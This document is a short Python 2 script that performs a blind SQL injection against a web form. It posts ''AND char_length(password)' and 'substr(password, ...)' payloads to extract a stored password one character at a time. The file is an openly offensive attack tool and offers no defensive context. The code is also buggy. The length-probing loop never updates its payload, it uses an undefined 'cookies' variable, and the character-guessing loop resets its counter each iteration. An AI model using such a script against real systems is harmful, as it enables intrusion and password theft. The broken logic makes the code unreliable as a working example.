import requests
import sys

url = sys.argv[1]
yes = sys.argv[2]
answer = []
i = 1
asciivalue = 1

letterss = []
print "Kicking off the attempt"

payload = {'injection': '\'AND char_length(password) = '+str(i)+';#', 'Submit': 'submit'}

while True:
	req = requests.post(url, data=payload)
	lengthtest = req.text
	if yes in lengthtest:
		length = i
		break
	i = i+1


for x in range(1, length):
	payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) = '+ chr(asciivalue)+';#', 'Submit': 'submit'}
	req = requests.post(url, data=payload, cookies=cookies)
	if yes in req.text:
		answer.append(asciivalue)
	else:
		asciivalue = asciivalue + 1
		pass
	asciivalue = 1
print "Recovered String: "+ ''.join(answer)